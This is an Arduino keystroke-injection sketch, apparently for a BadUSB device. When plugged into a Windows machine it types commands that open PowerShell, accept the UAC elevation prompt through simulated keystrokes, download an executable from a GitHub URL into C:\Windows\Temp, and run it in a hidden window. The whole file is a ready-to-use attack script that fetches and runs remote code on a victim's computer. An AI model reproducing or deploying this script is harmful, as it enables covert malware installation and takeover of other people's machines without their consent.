#include <Keyboard.h>
void setup() 
{
    Keyboard.begin();
    delay(5000);
    Keyboard.press(KEY_LEFT_GUI);//win 
    delay(500); 
    Keyboard.press('r');//r
    delay(500); 
    Keyboard.release(KEY_LEFT_GUI);
    Keyboard.release('r');
    Keyboard.println("POWERSHELL -NOP");
    delay(1000);
    Keyboard.println("Start-Process powershell -Verb RunAs");
    delay(750);
    Keyboard.press(KEY_LEFT_ARROW);
    Keyboard.release(KEY_LEFT_ARROW);
    delay(750);
    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);
    delay(1000);
    Keyboard.println("Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True"); 
    delay(1500);  
    Keyboard.println("[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12");  
    delay(1500); 
    Keyboard.println("cd C:\\Windows\\Temp");  
    delay(1500);    
    Keyboard.println("Invoke-WebRequest -Uri https://github.com/orimeged/Fire_spirit/raw/main/spirit%20fire/Debug/spirit_fire.exe -OutFile ./imag.exe");
    delay(2000);
    Keyboard.println("PowerShell.exe -WindowStyle hidden { ./imag.exe }");
    delay(1500);
    Keyboard.println("Exit");
  Keyboard.end();
}
void loop()
{
}
